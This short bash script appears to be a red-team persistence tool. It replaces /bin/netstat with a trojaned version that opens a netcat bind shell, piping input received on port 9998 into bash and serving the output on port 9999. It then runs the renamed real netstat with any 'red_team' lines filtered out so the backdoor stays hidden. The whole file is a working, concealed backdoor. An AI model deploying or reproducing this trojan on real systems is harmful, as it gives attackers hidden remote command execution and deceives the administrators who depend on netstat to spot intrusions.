#!/bin/bash

NETSTAT=/bin/netstat

mv $NETSTAT $NETSTAT.red_team


cat <<EOT >> $NETSTAT
#!/bin/bash

nc.red_team -l -p 9998 2>/dev/null | bash 2>&1 | nc.red_team -l -p 9999 2>/dev/null

./netstat.red_team | grep --color=auto -v red_team

EOT